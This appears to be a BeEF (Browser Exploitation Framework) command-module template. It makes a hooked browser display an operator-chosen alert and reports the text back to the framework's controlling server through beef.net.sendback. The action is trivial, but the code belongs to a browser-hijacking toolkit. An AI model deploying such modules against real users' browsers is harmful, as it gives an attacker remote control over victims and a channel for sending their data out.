beef.execute(function() {
	alert("<%== format_multiline(@text) %>");
	
	beef.net.sendback("<%= @command_url %>", <%= @command_id %>, "text=<%== format_multiline(@text) %>");
});